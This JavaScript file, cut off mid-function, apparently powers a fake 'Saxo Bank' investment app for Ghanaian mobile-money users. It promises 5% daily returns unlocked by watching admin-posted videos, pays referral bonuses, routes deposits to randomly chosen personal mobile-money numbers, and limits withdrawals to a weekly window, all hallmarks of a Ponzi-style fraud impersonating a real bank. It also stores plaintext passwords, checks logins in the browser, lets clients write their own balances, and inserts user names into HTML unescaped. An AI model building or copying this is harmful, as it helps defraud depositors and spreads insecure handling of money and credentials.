/* ================================================================
   SAXO BANK — app.js
   - Smart login: saves accounts, one-tap return login
   - Task-based earning: watch YouTube video to get daily 5%
   - Admin posts daily video link
   - No automatic midnight profit — must complete task
   - White/blue Saxo theme
   ================================================================ */

import { db, collection, doc, getDoc, getDocs, setDoc, updateDoc, addDoc, query, where, serverTimestamp } from './firebase.js';

const DAILY_RATE=0.05, INV_DAYS=30, WDR_FEE=0.014, REF_BONUS=0.05, MIN_WDR=30;
let _user=null, _settings={}, _pendingInvest=null;

/* ===== NETWORK DETECTION ===== */
function detectNetwork(phone){
  const p=phone.replace(/\D/g,'');
  if(/^(020|050)/.test(p)) return 'telecel';
  if(/^(026|056|027|057)/.test(p)) return 'airteltigo';
  return 'mtn';
}
function getPaymentAccount(momoNumber){
  const s=_settings,network=detectNetwork(momoNumber);
  let nums=[];
  if(network==='telecel') nums=s.telecelNumbers||[];
  else if(network==='airteltigo') nums=s.airteltigoNumbers||s.mtnNumbers||[];
  else nums=s.mtnNumbers||[];
  if(!nums.length) nums=s.paymentNumbers||[];
  if(!nums.length) return null;
  return nums[Math.floor(Math.random()*nums.length)];
}

/* ===== WITHDRAWAL ===== */
function isWithdrawalOpen(){
  const now=new Date(),day=now.getDay(),hour=now.getHours();
  if(day===3&&hour>=20) return true;
  if(day===4) return true;
  if(day===5&&hour===0) return true;
  return false;
}
function getWithdrawalInfo(){
  const now=new Date(),day=now.getDay(),hour=now.getHours();
  const open=isWithdrawalOpen();
  let msg='';
  if(day===3&&hour<20) msg='Opens today (Wednesday) at 8:00 PM.';
  else if((day===5&&hour>0)||day===6||day===0||day===1||day===2) msg='Next window: Wednesday 8:00 PM — Friday 12:00 AM.';
  else msg='Window: Wednesday 8:00 PM — Friday 12:00 AM.';
  return{open,msg};
}

/* ===== SETTINGS ===== */
async function loadAppSettings(){
  try{const snap=await getDoc(doc(db,'settings','config'));_settings=snap.exists()?snap.data():{};}
  catch(e){_settings={};}
}

const genRef=()=>'PAY-'+Math.floor(1e5+Math.random()*9e5);
const f2=n=>parseFloat(n||0).toFixed(2);
const fdate=ts=>{if(!ts)return'—';const d=ts.toDate?ts.toDate():new Date(ts);return d.toLocaleString('en-GH',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'});};
const validPhone=p=>/^0[2345]\d{8}$/.test(p);

/* ===== SAVED ACCOUNTS (smart login) ===== */
function getSavedAccounts(){
  try{return JSON.parse(localStorage.getItem('saxo_accounts'))||[];}
  catch{return[];}
}
function saveAccount(phone,name){
  let accounts=getSavedAccounts();
  accounts=accounts.filter(a=>a.phone!==phone);
  accounts.unshift({phone,name,savedAt:Date.now()});
  accounts=accounts.slice(0,5); // max 5 saved accounts
  localStorage.setItem('saxo_accounts',JSON.stringify(accounts));
}
function removeAccount(phone){
  let accounts=getSavedAccounts().filter(a=>a.phone!==phone);
  localStorage.setItem('saxo_accounts',JSON.stringify(accounts));
}

function renderSavedAccounts(){
  const accounts=getSavedAccounts();
  const savedSection=document.getElementById('savedAccountsSection');
  const authFormSection=document.getElementById('authFormSection');
  const savedList=document.getElementById('savedAccountsList');
  if(!savedSection||!savedList)return;
  if(accounts.length>0){
    savedSection.style.display='block';
    authFormSection.style.display='none';
    savedList.innerHTML=accounts.map(a=>`
      <div class="saved-account-item" onclick="quickLogin('${a.phone}')">
        <div class="sa-av">${a.name.charAt(0).toUpperCase()}</div>
        <div class="sa-info">
          <div class="sa-name">${a.name}</div>
          <div class="sa-phone">${a.phone}</div>
        </div>
        <span class="sa-arrow">›</span>
      </div>
    `).join('');
  }else{
    savedSection.style.display='none';
    authFormSection.style.display='block';
  }
}

async function quickLogin(phone){
  // Show password prompt for quick login
  const pass=prompt('Enter your password for '+phone+':');
  if(!pass)return;
  showLoading(true);
  try{
    const snap=await getDoc(doc(db,'users',phone));
    if(!snap.exists()||snap.data().deleted||snap.data().pass!==pass){showLoading(false);toast('Incorrect password','error');return;}
    _user=snap.data();
    localStorage.setItem('saxo_me',phone);
    saveAccount(phone,_user.name);
    showLoading(false);
    launchApp();
  }catch(e){showLoading(false);toast('Login failed','error');}
}

function showAddAccount(){
  document.getElementById('savedAccountsSection').style.display='none';
  document.getElementById('authFormSection').style.display='block';
  switchAuthTab('login');
}

function switchAccount(){
  _user=null;
  localStorage.removeItem('saxo_me');
  document.getElementById('appScreen').style.display='none';
  document.getElementById('authScreen').style.display='flex';
  renderSavedAccounts();
}

/* ===== PHONE ===== */
function livePhone(inp){
  inp.value=inp.value.replace(/\D/g,'').slice(0,10);
  const h=document.getElementById('phoneHint');if(!h)return;
  const v=inp.value;
  if(!v){h.style.color='var(--dim)';h.textContent='Must be exactly 10 digits';}
  else if(v.length<10){h.style.color='var(--red)';h.textContent=v.length+'/10 — keep typing';}
  else if(!validPhone(v)){h.style.color='var(--red)';h.textContent='Invalid number';}
  else{h.style.color='var(--green)';h.textContent='✓ Valid Ghana number';}
}

/* ===== UI ===== */
function toast(msg,type='success'){const t=document.getElementById('toast');if(!t)return;t.textContent=msg;t.className='toast show '+type;setTimeout(()=>{t.className='toast';},3400);}
function modal(icon,title,body){
  document.getElementById('modalIcon').textContent=icon;
  document.getElementById('modalTitle').textContent=title;
  document.getElementById('modalBody').innerHTML=body;
  document.getElementById('modal').style.display='flex';
}
function closeModal(){document.getElementById('modal').style.display='none';}
function showLoading(s){const el=document.getElementById('loadingOverlay');if(el)el.style.display=s?'flex':'none';}
function hideLoadingScreen(){const ls=document.getElementById('loadingScreen');if(ls){ls.style.opacity='0';ls.style.transition='opacity .3s';setTimeout(()=>{ls.style.display='none';},300);}}

/* ===== AUTH ===== */
function switchAuthTab(tab){
  document.querySelectorAll('.auth-tab').forEach((b,i)=>b.classList.toggle('active',(i===0)===(tab==='login')));
  document.getElementById('loginForm').style.display=tab==='login'?'block':'none';
  document.getElementById('registerForm').style.display=tab==='register'?'block':'none';
}

async function register(){
  const name=document.getElementById('regName').value.trim();
  const phone=document.getElementById('regPhone').value.trim();
  const email=(document.getElementById('regEmail').value||'').trim().toLowerCase();
  const pass=document.getElementById('regPass').value;
  const rc=document.getElementById('regRef').value.trim().toUpperCase();
  if(!name||!phone||!pass){toast('Fill all required fields','error');return;}
  if(phone.length!==10||!validPhone(phone)){toast('Enter a valid 10-digit Ghana number','error');return;}
  if(pass.length<6){toast('Password must be at least 6 characters','error');return;}
  showLoading(true);
  try{
    const ex=await getDoc(doc(db,'users',phone));
    if(ex.exists()){toast('Account already exists for this number','error');showLoading(false);return;}
    const refCode='REF-'+Math.random().toString(36).substr(2,5).toUpperCase();
    await setDoc(doc(db,'users',phone),{id:phone,name,phone,email,pass,balance:0,deposited:0,withdrawn:0,invested:0,profit:0,refEarned:0,refCode,referredBy:rc||null,refCount:0,bonusPaid:false,joined:serverTimestamp()});
    _user={id:phone,name,phone,email,pass,balance:0,deposited:0,withdrawn:0,invested:0,profit:0,refEarned:0,refCode,referredBy:rc||null,refCount:0,bonusPaid:false};
    localStorage.setItem('saxo_me',phone);
    saveAccount(phone,name);
    emailAdmin('new_user',{name,phone,email},null,null);
    showLoading(false);
    launchApp();
  }catch(e){showLoading(false);console.error(e);toast('Registration failed.','error');}
}

async function login(){
  const phone=document.getElementById('loginPhone').value.trim();
  const pass=document.getElementById('loginPass').value;
  if(!phone||!pass){toast('Enter your number and password','error');return;}
  if(!validPhone(phone)){toast('Enter a valid Ghana number','error');return;}
  showLoading(true);
  try{
    const snap=await getDoc(doc(db,'users',phone));
    if(!snap.exists()||snap.data().deleted||snap.data().pass!==pass){showLoading(false);toast('Incorrect number or password','error');return;}
    _user=snap.data();
    localStorage.setItem('saxo_me',phone);
    saveAccount(phone,_user.name);
    showLoading(false);
    launchApp();
  }catch(e){showLoading(false);toast('Login failed.','error');}
}

function logout(){
  _user=null;
  localStorage.removeItem('saxo_me');
  location.replace(location.pathname);
}

/* ===== BOOT ===== */
async function boot(){
  const phone=localStorage.getItem('saxo_me');
  if(!phone){
    hideLoadingScreen();
    document.getElementById('authScreen').style.display='flex';
    document.getElementById('appScreen').style.display='none';
    renderSavedAccounts();
    return;
  }
  try{
    await loadAppSettings();
    const snap=await getDoc(doc(db,'users',phone));
    if(!snap.exists()||snap.data().deleted){
      localStorage.removeItem('saxo_me');
      hideLoadingScreen();
      document.getElementById('authScreen').style.display='flex';
      document.getElementById('appScreen').style.display='none';
      renderSavedAccounts();
      return;
    }
    _user=snap.data();
  }catch(e){
    hideLoadingScreen();
    document.getElementById('authScreen').style.display='flex';
    document.getElementById('appScreen').style.display='none';
    renderSavedAccounts();
    return;
  }
  hideLoadingScreen();
  launchApp();
}

function launchApp(){
  document.getElementById('authScreen').style.display='none';
  document.getElementById('appScreen').style.display='flex';
  const lastPage=localStorage.getItem('saxo_last_page')||'dashboard';
  const valid=['dashboard','deposit','invest','withdraw','referral','history','task','more'];
  const startPage=valid.includes(lastPage)?lastPage:'dashboard';
  renderSidebar();
  history.replaceState({page:startPage},startPage);
  activatePage(startPage);
  window.onpopstate=e=>activatePage(e.state?.page||'dashboard');
  // Check for pending task reward
  setTimeout(checkTaskReturn,1000);
}

async function refreshUser(){
  if(!_user)return;
  try{const snap=await getDoc(doc(db,'users',_user.phone));if(snap.exists())_user=snap.data();}catch(e){}
}

/* ===== TASK-BASED EARNING ===== */
// Called when user returns from watching YouTube video
async function checkTaskReturn(){
  const u=_user;if(!u)return;
  const today=new Date().toDateString();
  const taskKey='saxo_task_return_'+u.phone;
  const taskDone='saxo_task_done_'+u.phone;
  // Check if we flagged them as having watched today
  if(localStorage.getItem(taskKey)===today&&localStorage.getItem(taskDone)!==today){
    // Credit their daily profit
    await creditDailyProfit();
    localStorage.setItem(taskDone,today);
    localStorage.removeItem(taskKey);
  }
}

async function creditDailyProfit(){
  const u=_user;if(!u)return;
  try{
    const q=query(collection(db,'investments'),where('userId','==',u.phone),where('status','==','active'));
    const snap=await getDocs(q);
    if(snap.empty){
      modal('📹','Video Watched!','Thanks for watching! You don\'t have any active investments yet.<br><br><a onclick="closeModal();showPage(\'invest\')" style="color:var(--accent);font-weight:600;">Start investing to earn daily returns →</a>');
      return;
    }
    let total=0;
    for(const invDoc of snap.docs){
      const inv=invDoc.data();
      const startMs=inv.startDate?.toDate?inv.startDate.toDate().getTime():Date.now();
      const daysTotal=Math.floor((Date.now()-startMs)/86400000);
      const profit=parseFloat(inv.daily.toFixed(2));
      total+=profit;
      await updateDoc(doc(db,'investments',invDoc.id),{credited:parseFloat(((inv.credited||0)+profit).toFixed(2)),lastCredit:serverTimestamp(),status:daysTotal>=INV_DAYS?'completed':'active'});
    }
    if(total>0){
      const fresh=(await getDoc(doc(db,'users',u.phone))).data();
      const newBal=parseFloat(((fresh.balance||0)+total).toFixed(2));
      await updateDoc(doc(db,'users',u.phone),{balance:newBal,profit:parseFloat(((fresh.profit||0)+total).toFixed(2))});
      _user.balance=newBal;
      await addDoc(collection(db,'transactions'),{userId:u.phone,userName:u.name,userPhone:u.phone,type:'profit',amount:total,status:'approved',description:'Daily return — task completed — GHS '+f2(total),createdAt:serverTimestamp()});
      renderSidebar();
      modal('🎉','Daily Return Credited!',
        'You watched today\'s video and earned your daily return!<br><br>'+
        '<div style="background:var(--accent-dim);border:1px solid var(--accent-border);border-radius:var(--r);padding:1rem;margin:.5rem 0;text-align:center;">'+
        '<div style="font-size:1.8rem;font-weight:700;color:var(--accent);">+GHS '+f2(total)+'</div>'+
        '<div style="font-size:.75rem;color:var(--dim);margin-top:.2rem;">Added to your account ✅</div>'+
        '</div>'+
        'Come back tomorrow and watch the next video to earn again!'
      );
    }
  }catch(e){console.warn('Credit profit error:',e);}
}

async function renderTaskPage(){
  const u=_user;
  const el=document.getElementById('taskContent');if(!el)return;
  const today=new Date().toDateString();
  const taskDone=localStorage.getItem('saxo_task_done_'+u.phone)===today;

  // Check if user has active investments
  let hasInvestment=false;
  try{
    const q=query(collection(db,'investments'),where('userId','==',u.phone),where('status','==','active'));
    const snap=await getDocs(q);
    hasInvestment=!snap.empty;
  }catch(e){}

  // Get today's video from settings
  const todayVideo=_settings.dailyVideoUrl||'';
  const todayVideoTitle=_settings.dailyVideoTitle||'Today\'s Investment Insight';

  if(taskDone){
    // Already done today
    el.innerHTML=`
      <div class="task-daily-box">
        <div class="task-header-row">
          <div class="task-icon-wrap"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
          <div><div class="task-title-main">Daily Task Complete ✅</div><div class="task-title-sub">You've completed today's task</div></div>
        </div>
        <div class="task-done-banner">
          <div class="task-done-icon">🎉</div>
          <div class="task-done-title">Return credited for today!</div>
          <div class="task-done-sub">Come back tomorrow for a new video and earn again.</div>
        </div>
      </div>`;
    return;
  }

  if(!todayVideo){
    el.innerHTML=`
      <div class="task-daily-box">
        <div class="task-header-row">
          <div class="task-icon-wrap"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
          <div><div class="task-title-main">Daily Task</div><div class="task-title-sub">Watch today's video to earn</div></div>
        </div>
        <div class="task-no-video">
          <div style="font-size:1.5rem;margin-bottom:.4rem;">⏳</div>
          <div style="font-weight:600;color:var(--dim);margin-bottom:.2rem;">No video posted yet today</div>
          <div style="font-size:.78rem;">Admin will post today's video shortly. Check back soon!</div>
        </div>
      </div>`;
    return;
  }

  const reward=await getDailyReward();

  el.innerHTML=`
    <div class="task-daily-box">
      <div class="task-header-row">
        <div class="task-icon-wrap">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round"><polygon points="5 3 19 12 5 21 5 3"/></svg>
        </div>
        <div>
          <div class="task-title-main">Watch to Earn</div>
          <div class="task-title-sub">${todayVideoTitle}</div>
        </div>
      </div>
      ${!hasInvestment?`<div class="task-no-invest">⚠️ You need an active investment to earn from tasks. <a onclick="showPage('invest')" style="color:var(--accent);font-weight:600;">Invest now →</a></div>`:''}
      <div class="task-reward-row">
        <span class="task-reward-lbl">Today's reward if you watch:</span>
        <span class="task-reward-val">${reward>0?'+GHS '+f2(reward)+' (5% return)':'Invest first to earn'}</span>
      </div>
      <div style="background:var(--bg);border:1px solid var(--border2);border-radius:var(--r);padding:1rem;margin-bottom:1rem;">
        <div style="font-size:.8rem;color:var(--dim);margin-bottom:.6rem;line-height:1.6;">
          📋 <strong>How it works:</strong><br/>
          1. Click the button below to watch the video<br/>
          2. Watch the full video on YouTube<br/>
          3. Come back here — your return will be credited automatically
        </div>
      </div>
      <a href="${todayVideo}" target="_blank" onclick="markTaskStarted()" class="btn-primary" style="display:block;text-align:center;color:#fff;">
        ▶ Watch Today's Video
      </a>
      <p style="font-size:.72rem;color:var(--dim);text-align:center;margin-top:.6rem;">Opens YouTube · Come back after watching</p>
    </div>`;
}

async function getDailyReward(){
  const u=_user;if(!u)return 0;
  try{
    const q=query(collection(db,'investments'),where('userId','==',u.phone),where('status','==','active'));
    const snap=await getDocs(q);
    return snap.docs.reduce((s,d)=>s+parseFloat(d.data().daily||0),0);
  }catch(e){return 0;}
}

function markTaskStarted(){
  const today=new Date().toDateString();
  const taskKey='saxo_task_return_'+_user.phone;
  localStorage.setItem(taskKey,today);
  // After 10 seconds check if they came back (tab still open)
  setTimeout(()=>checkTaskReturn(),10000);
}
window.markTaskStarted=markTaskStarted;

/* ===== SIDEBAR ===== */
function renderSidebar(){
  const u=_user;if(!u)return;
  const ini=u.name.charAt(0).toUpperCase();
  ['sidebarAv','mobileAv','moreAv'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent=ini;});
  const n=u.name.split(' ')[0];
  ['sidebarName','welcomeName','moreName'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent=id==='moreName'?u.name:n;});
  ['sidebarBal','moreBal'].forEach(id=>{const el=document.getElementById(id);if(el)el.textContent=f2(u.balance);});
}

/* ===== NAVIGATION ===== */
function activatePage(page){
  localStorage.setItem('saxo_last_page',page);
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.nav-item,.bn-item').forEach(n=>n.classList.remove('active'));
  document.getElementById('page-'+page)?.classList.add('active');
  document.querySelector('[data-page="'+page+'"]')?.classList.add('active');
  document.querySelector('[data-bnpage="'+page+'"]')?.classList.add('active');
  window.scrollTo(0,0);
  renderPage(page);
}
function showPage(page){history.pushState({page},page);activatePage(page);}
function goBack(){history.back();}

function renderPage(p){
  if(p==='dashboard')renderDash();
  if(p==='deposit')renderDeposit();
  if(p==='task')renderTaskPage();
  if(p==='withdraw')renderWithdraw();
  if(p==='referral')renderReferral();
  if(p==='history')renderHistory('all');
  if(p==='more')renderMore();
  if(p==='invest-confirm')renderConfirmScreen();
}

/* ===== INVEST CONFIRM ===== */
function showConfirm(amount,planName){
  const u=_user;
  if(u.balance<amount){modal('⚠️','Insufficient Balance','You need <strong>GHS '+f2(amount)+'</strong>.<br>Your balance: <strong>GHS '+f2(u.balance)+'</strong><br><br>Please deposit first.');return;}
  _pendingInvest={amount,planName};
  history.pushState({page:'invest-confirm'},'invest-confirm');
  activatePage('invest-confirm');
}
function renderConfirmScreen(){
  if(!_pendingInvest)return;
  const{amount,planName}=_pendingInvest;
  document.getElementById('icAmount').textContent='GHS '+f2(amount);
  document.getElementById('icPlanName').textContent=planName+' Plan';
  document.getElementById('icDaily').textContent='GHS '+f2(amount*DAILY_RATE)+' per day';
  document.getElementById('icReturn').textContent='GHS '+f2(amount*1.5);
  document.getElementById('icBalance').textContent=f2(_user.balance);
}
async function confirmInvest(){
  if(!_pendingInvest)return;
  const{amount}=_pendingInvest,u=_user;
  if(u.balance<amount){modal('⚠️','Insufficient Balance','Balance too low.');return;}
  showLoading(true);
  try{
    const newBal=parseFloat((u.balance-amount).toFixed(2));
    await updateDoc(doc(db,'users',u.phone),{balance:newBal,invested:parseFloat(((u.invested||0)+amount).toFixed(2))});
    _user.balance=newBal;_user.invested=(_user.invested||0)+amount;
    await addDoc(collection(db,'investments'),{userId:u.phone,userName:u.name,amount,startDate:serverTimestamp(),endDate:new Date(Date.now()+INV_DAYS*86400000),daily:parseFloat((amount*DAILY_RATE).toFixed(2)),totalReturn:parseFloat((amount*DAILY_RATE*INV_DAYS).toFixed(2)),credited:0,status:'active',lastCredit:null});
    await addDoc(collection(db,'transactions'),{userId:u.phone,userName:u.name,userPhone:u.phone,type:'invest',amount,status:'active',description:'Investment — GHS '+amount+' (30 days)',createdAt:serverTimestamp()});
    emailAdmin('invest',u,null,amount);
    _pendingInvest=null;showLoading(false);renderSidebar();
    history.pushState({page:'task'},'task');activatePage('task');
    modal('✅','Investment Active!',
      '<strong>GHS '+f2(amount)+'</strong> invested!<br><br>'+
      '📈 Daily return: <strong>GHS '+f2(amount*DAILY_RATE)+'</strong><br>'+
      '📅 Duration: <strong>30 days</strong><br><br>'+
      '📹 <strong>Complete your daily task</strong> to unlock each day\'s return. Watch today\'s video now!'
    );
  }catch(e){showLoading(false);toast('Investment failed.','error');}
}

/* ===== DASHBOARD ===== */
async function renderDash(){
  await refreshUser();
  const u=_user;
  ['stBal','stDep','stWdr','stRef','stPft'].forEach((id,i)=>{
    const vals=[u.balance,u.deposited,u.withdrawn,u.refEarned,u.profit];
    const el=document.getElementById(id);if(el)el.textContent=f2(vals[i]);
  });
  renderSidebar();
  try{
    const q=query(collection(db,'investments'),where('userId','==',u.phone),where('status','==','active'));
    const snap=await getDocs(q);const invs=snap.docs.map(d=>d.data());
    const stInv=document.getElementById('stInv');if(stInv)stInv.textContent=f2(invs.reduce((s,i)=>s+i.amount,0));
    renderActiveInvs(invs);
  }catch(e){const el=document.getElementById('stInv');if(el)el.textContent='0.00';}
  try{
    const q2=query(collection(db,'transactions'),where('userId','==',u.phone));
    const snap2=await getDocs(q2);
    const txs=snap2.docs.map(d=>d.data()).sort((a,b)=>{const at=a.createdAt?.toDate?a.createdAt.toDate():new Date(0);const bt=b.createdAt?.toDate?b.createdAt.toDate():new Date(0);return bt-at;}).slice(0,5);
    renderRecentTx(txs);
  }catch(e){}
}
function renderActiveInvs(invs){
  const el=document.getElementById('activeInvList');if(!el)return;
  if(!invs.length){el.innerHTML='<div class="empty-msg">No active positions. <a onclick="showPage(\'invest\')">Start investing →</a></div>';return;}
  el.innerHTML=invs.map(inv=>{
    const start=inv.startDate?.toDate?inv.startDate.toDate():new Date(inv.startDate||Date.now());
    const elapsed=Math.min(Math.floor((Date.now()-start.getTime())/86400000),INV_DAYS);
    return`<div class="inv-item"><div class="inv-top"><span class="inv-amt">GHS ${f2(inv.amount)}</span><span class="inv-pill">Active</span></div><div class="inv-bar-bg"><div class="inv-bar" style="width:${(elapsed/INV_DAYS)*100}%"></div></div><div class="inv-meta"><span>Day ${elapsed}/${INV_DAYS}</span><span>GHS ${f2(inv.daily)}/day</span></div></div>`;
  }).join('');
}
function renderRecentTx(txs){
  const el=document.getElementById('recentTxList');if(!el)return;
  if(!txs||!txs.length){el.innerHTML='<div class="empty-msg">No activity yet.</div>';return;}
  el.innerHTML=txs.map(t=>{
    const M={deposit:['↓','in'],invest:['◎','inv'],withdraw:['↑','out'],referral:['⬡','ref'],profit:['▲','in']};
    const[ic,cl]=M[t.type]||['?','in'];const pos=['deposit','referral','profit'].includes(t.type);
    return`<div class="tx-item"><div class="tx-ic ${cl}">${ic}</div><div class="tx-info"><div class="tx-desc">${t.description||t.type}</div><div class="tx-date">${fdate(t.createdAt)}</div></div><div class="tx-amt ${pos?'pos':'neg'}">${pos?'+':'-'}GHS ${f2(t.amount)}</div></div>`;
  }).join('');
}

/* ===== DEPOSIT ===== */
function renderDeposit(){
  const rb=document.getElementById('depRefBox'),pb=document.getElementById('depPendingBox'),fa=document.getElementById('depFormArea');
  if(rb)rb.style.display='none';if(pb)pb.style.display='none';if(fa)fa.style.display='block';
}
async function initiateDeposit(){
  const amt=parseFloat(document.getElementById('depAmt').value);
  const momo=document.getElementById('depMomo').value.trim();
  if(!amt||amt<10){toast('Enter a valid amount (min GHS 10)','error');return;}
  if(!momo||momo.length!==10){toast('Enter your 10-digit MoMo number first','error');return;}
  if(!_settings.mtnNumbers&&!_settings.telecelNumbers&&!_settings.paymentNumbers){showLoading(true);await loadAppSettings();showLoading(false);}
  const ref=genRef(),network=detectNetwork(momo),acct=getPaymentAccount(momo);
  if(!acct){modal('⚠️','Setup Pending','Payment accounts not yet configured. Please try again shortly.');return;}
  document.getElementById('refAmtTxt').textContent='GHS '+f2(amt);
  document.getElementById('refAccNum').textContent=acct.number;
  document.getElementById('refAccName').textContent=acct.name||'Saxo Bank GH';
  document.getElementById('refNetwork').textContent=network==='telecel'?'Telecel Cash':network==='airteltigo'?'AirtelTigo Money':'MTN MoMo';
  document.getElementById('refCode').textContent=ref;
  document.getElementById('depRefBox').style.display='block';
  const u=_user;
  try{await addDoc(collection(db,'transactions'),{userId:u.phone,userName:u.name,userPhone:u.phone,type:'deposit',amount:amt,ref,account:acct.number,accountLabel:acct.name||'',momoNumber:momo,network,status:'pending',description:'Deposit — Ref: '+ref,createdAt:serverTimestamp()});}catch(e){}
}
async function submitDeposit(){
  const u=_user,amt=parseFloat(document.getElementById('depAmt').value)||0,ref=document.getElementById('refCode').textContent,momo=document.getElementById('depMomo').value.trim(),network=detectNetwork(momo);
  smsAdmin('SAXO DEPOSIT:\n'+u.name+' ('+u.phone+')\nAmount: GHS '+f2(amt)+'\nNetwork: '+network.toUpperCase()+'\nRef: '+ref+'\nPlease verify & approve.');
  emailAdmin('deposit',u,ref,amt);
  const fa=document.getElementById('depFormArea'),rb=document.getElementById('depRefBox'),pb=document.getElementById('depPendingBox');
  if(fa)fa.style.display='none';if(rb)rb.style.display='none';
  if(document.getElementById('depPendingRef'))document.getElementById('depPendingRef').textContent=ref;
  if(document.getElementById('depPendingAmt'))document.getElementById('depPendingAmt').textContent='GHS '+f2(amt);
  if(pb)pb.style.display='block';window.scrollTo(0,0);
}

/* ===== WITHDRAW ===== */
function renderWithdraw(){
  const u=_user;const wb=document.getElementById('wdrBal');if(wb)wb.textContent=f2(u.balance);
  const bn=document.getElementById('wdrBanner'),info=getWithdrawalInfo();if(!bn)return;
  if(info.open){bn.className='wdr-banner-open';bn.innerHTML='<span>✅</span><div><strong>Withdrawals open!</strong> Submit now. Funds sent to your MoMo <strong>every Thursday</strong>.</div>';}
  else{bn.className='wdr-banner-closed';bn.innerHTML='<span>📅</span><div><strong>Withdrawals processed every Thursday.</strong> '+info.msg+' You can submit now — processed on Thursday.</div>';}
  const btn=document.getElementById('wdrSubmitBtn');if(btn){btn.disabled=false;btn.style.opacity='1';btn.style.cursor='pointer';}
}
function calcFee(){
  const amt=parseFloat(document.getElementById('wdrAmt').value)||0,fee=parseFloat((amt*WDR_FEE).toFixed(2)),you=parseFloat((amt-fee).toFixed(2)),fb=document.getElementById('feeBox');
  if(amt>0){fb.style.display='block';document.getElementById('feeAmt').textContent='GHS '+f2(amt);document.getElementById('feeFee').textContent='- GHS '+f2(fee);document.getElementById('feeTotal').textContent='GHS '+f2(you);}
  else fb.style.display='none';
}
async function requestWithdrawal(){
  const amt=parseFloat(document.getElementById('wdrAmt').value),momo=document.getElementById('wdrMomo').value.trim(),net=document.getElementById('wdrNet').value,u=_user;
  if(!amt||amt<MIN_WDR){modal('⚠️','Minimum Withdrawal','Minimum is <strong>GHS '+MIN_WDR+'</strong>.');return;}
  if(!momo||momo.length!==10){toast('Enter valid 10-digit MoMo number','error');return;}
  if(!net){toast('Select your network','error');return;}
  if(u.balance<amt){modal('⚠️','Insufficient Balance','Need <strong>GHS '+f2(amt)+'</strong>. Balance: <strong>GHS '+f2(u.balance)+'</strong>');return;}
  const fee=parseFloat((amt*WDR_FEE).toFixed(2)),you=parseFloat((amt-fee).toFixed(2));
  showLoading(true);
  try{
    const newBal=parseFloat((u.balance-amt).toFixed(2));
    await updateDoc(doc(db,'users',u.phone),{balance:newBal,withdrawn:parseFloat(((u.withdrawn||0)+amt).toFixed(2))});
    _user.balance=newBal;_user.withdrawn=(_user.withdrawn||0)+amt;
    await addDoc(collection(db,'transactions'),{userId:u.phone,userName:u.name,userPhone:u.phone,type:'withdraw',amount:amt,youReceive:you,fee,momo,network:net,status:'pending',description:'Withdrawal — '+net+' '+momo,createdAt:serverTimestamp()});
    emailAdmin('withdraw',u,null,amt);
    showLoading(false);renderSidebar();renderWithdraw();
    ['wdrAmt','wdrMomo'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});
    const wn=document.getElementById('wdrNet');if(wn)wn.value='';
    const fb=document.getElementById('feeBox');if(fb)fb.style.display='none';
    modal('✅','Withdrawal Submitted!','Request of <strong>GHS '+f2(amt)+'</strong> submitted.<br><br>📱 To: <strong>'+net+' — '+momo+'</strong><br>💸 Fee: <strong>GHS '+f2(fee)+'</strong><br>✅ You receive: <strong>GHS '+f2(you)+'</strong><br><br>📅 <strong>Processed every Thursday.</strong>');
  }catch(e){showLoading(false);toast('Withdrawal failed.','error');}
}

/* ===== REFERRAL ===== */
async function renderReferral(){
  const u=_user;
  try{const q=query(collection(db,'users'),where('referredBy','==',u.refCode));const snap=await getDocs(q);const el=document.getElementById('refCount');if(el)el.textContent=snap.size;}catch(e){}
  const re=document.getElementById('refEarned');if(re)re.textContent=f2(u.refEarned);
  const rc=document.getElementById('refCodeEl');if(rc)rc.value=u.refCode;
  const rl=document.getElementById('refLinkEl');if(rl)rl.value=location.origin+'/dashboard.html?ref='+u.refCode;
}
function copyText(elId,msg){navigator.clipboard.writeText(document.getElementById(elId).value);toast(msg);}

/* ===== HISTORY ===== */
async function renderHistory(filter){
  const u=_user,el=document.getElementById('historyList');if(!el)return;
  el.innerHTML='<div class="empty-msg">Loading...</div>';
  try{
    const q=query(collection(db,'transactions'),where('userId','==',u.phone));
    const snap=await getDocs(q);
    let txs=snap.docs.map(d=>d.data()).sort((a,b)=>{const at=a.createdAt?.toDate?a.createdAt.toDate():new Date(0);const bt=b.createdAt?.toDate?b.createdAt.toDate():new Date(0);return bt-at;});
    if(filter!=='all')txs=txs.filter(t=>t.type===filter);
    if(!txs.length){el.innerHTML='<div class="empty-msg" style="opacity:.5">No transactions found.</div>';return;}
    el.innerHTML=txs.map(t=>{
      const M={deposit:['↓','in'],invest:['◎','inv'],withdraw:['↑','out'],referral:['⬡','ref'],profit:['▲','in']};
      const[ic,cl]=M[t.type]||['?','in'];const pos=['deposit','referral','profit'].includes(t.type);
      const pill='<span class="status-pill sp-'+(t.status||'approved')+'">'+(t.status||'approved')+'</span>';
      return'<div class="history-item"><div class="tx-ic '+cl+'">'+ic+'</div><div class="h-info"><div class="h-desc">'+(t.description||t.type)+'</div><div class="h-date">'+fdate(t.createdAt)+'</div></div>'+pill+'<div class="tx-amt '+(pos?'pos':'neg')+'">'+(pos?'+':'-')+'GHS '+f2(t.amount)+'</div></div>';
    }).join('');
  }catch(e){el.innerHTML='<div class="empty-msg" style="color:var(--red)">Error loading. Please refresh.</div>';}
}
function filterTx(f,btn){document.querySelectorAll('.filter-row .filter-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');renderHistory(f);}

/* ===== MORE ===== */
function renderMore(){
  const u=_user;
  const ma=document.getElementById('moreAv'),mn=document.getElementById('moreName'),mb=document.getElementById('moreBal');
  if(ma)ma.textContent=u.name.charAt(0).toUpperCase();if(mn)mn.textContent=u.name;if(mb)mb.textContent=f2(u.balance);
}

/* ===== SMS + EMAIL ===== */
function smsAdmin(msg){
  const s=_settings;if(!s.arkeselKey||!s.adminPhone)return;
